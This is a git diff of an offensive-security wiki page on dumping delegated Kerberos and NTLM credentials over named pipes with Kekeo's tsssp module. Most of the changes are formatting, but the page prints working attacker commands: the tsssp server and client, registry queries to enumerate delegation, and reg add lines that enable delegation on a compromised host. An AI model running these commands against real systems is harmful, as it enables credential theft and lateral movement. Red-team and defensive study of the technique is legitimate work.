@@ -30,14 +30,12 @@ If credential delegation is set up, credentials can be dumped without touching l
 
 Let's spin up a tsssp named pipe server where targets of whom the credentials we want to steal, will connect to, on the compromised workstation ws01 \(running as SYSTEM\):
 
-{% tabs %}
-{% tab title="attacker@ws01.offense.local" %}
+{% code title="attacker@ws01.offense.local" %}
 ```text
 // needs to run as NT SYSTEM
 tsssp::server
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 {% hint style="info" %}
 Kekeo on ws01 must be running as NT\SYSTEM for this to work
@@ -45,13 +43,11 @@ Kekeo on ws01 must be running as NT\SYSTEM for this to work
 
 Now, let's connect to the tsssp server on ws01 from the target computer ws02 \(we want currently logged on user's from ws02 credentials to be stolen by being sent to the tsssp server on ws01 over the named pipe\):
 
-{% tabs %}
-{% tab title="attacker@ws02.offense.local" %}
+{% code title="attacker@ws02.offense.local" %}
 ```text
 tsssp::client /target:termsrv/ws01.offense.local /pipe:\\ws01.offense.local\pipe\kekeo_tsssp_endpoint
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ![](../../.gitbook/assets/password-delegation-password-dump-via-named-pipes.gif)
 
@@ -59,35 +55,31 @@ tsssp::client /target:termsrv/ws01.offense.local /pipe:\\ws01.offense.local\pipe
 
 The same technique applies to NTLM authentication. For the technique to work with NTLM credentials, below needs to be enabled in AD in Computer Configuration &gt; Policies &gt; Administrative Templates &gt; System &gt; Credential Delegation:
 
-![](../../.gitbook/assets/image%20%2894%29.png)
+![](../../.gitbook/assets/image%20%28102%29.png)
 
 Differently from dumping kerberos credentials, the NTLM delegated credential dumping attack can be performed locally on the target system - we only need two kekeo instances running as low privileged users, unlike with kerberos credential dumping where the tsssp server had to be running as SYSTEM.
 
 Let's spin up the server on one console:
 
-{% tabs %}
-{% tab title="attacker@ws02" %}
+{% code title="attacker@ws02" %}
 ```text
 // running as ws02\spotless
 tsssp::server
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 And connect to it from another console:
 
-{% tabs %}
-{% tab title="attacker@ws02" %}
+{% code title="attacker@ws02" %}
 ```text
 // running as ws02\spotless
 tsssp::client /target:termsrv/ws02.offense.local
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 Below shows \(left\) a tsssp server is created on the ws02 system running under spotless user's context. On the right, another console running as ws02\spotless which is then connected to the `\\.\pipe\kekeo_tsssp_endpoint` named pipe, revealing user's `ws02\spotless` NTLM credentials in the console running tsssp server on the left:
 
-![](../../.gitbook/assets/image%20%28177%29.png)
+![](../../.gitbook/assets/image%20%28191%29.png)
 
 ## Enumerating Delegated Credentials Locally
 
@@ -99,7 +91,7 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation
 
 Below shows what credential delegation is enabled on the system \(represented with 0x1\):
 
-![](../../.gitbook/assets/image%20%2846%29.png)
+![](../../.gitbook/assets/image%20%2849%29.png)
 
 We can then check what SPNs accept delegated credentials:
 
@@ -109,7 +101,7 @@ HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation\All
 
 Below shows that the box we have access to is allowed to delegate credentials to all termsrv SPNs - all RDP services:
 
-![](../../.gitbook/assets/image%20%2853%29.png)
+![](../../.gitbook/assets/image%20%2857%29.png)
 
 ## Enumerating Delegated Credentials via AD
 
@@ -118,7 +110,7 @@ gpresult /h report.html
 # or Get-GPOReport if you have access to AD admin tools
 ```
 
-![](../../.gitbook/assets/image%20%2844%29.png)
+![](../../.gitbook/assets/image%20%2847%29.png)
 
 Additionally, we can use [Parse-Polfile](https://github.com/PowerShell/GPRegistryPolicyParser) to parse the registry.pol of the linked GPO. First of, let's find the GPO that is being applied to the user spotless:
 
@@ -126,7 +118,7 @@ Additionally, we can use [Parse-Polfile](https://github.com/PowerShell/GPRegistr
 Get-NetGPO -UserIdentity spotless
 ```
 
-![](../../.gitbook/assets/image%20%2887%29.png)
+![](../../.gitbook/assets/image%20%2895%29.png)
 
 and then parse the policy file:
 
@@ -134,14 +126,13 @@ and then parse the policy file:
 Parse-PolFile -Path "\\offense.local\sysvol\offense.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol"
 ```
 
-![](../../.gitbook/assets/image%20%2883%29.png)
+![](../../.gitbook/assets/image%20%2890%29.png)
 
 ## Enabling Credential Delegation
 
 If you have admin rights on the compromised box, you can enable all credential delegation like so:
 
-{% tabs %}
-{% tab title="attacker@target" %}
+{% code title="attacker@target" %}
 ```csharp
 reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation /v AllowDefaultCredentials /t REG_DWORD /d 1
 reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation /v ConcatenateDefaults_AllowDefault /t REG_DWORD /d 1
@@ -153,8 +144,7 @@ reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation\AllowDefC
 # delete all
 reg delete HKLM\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation /f
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ## References
 
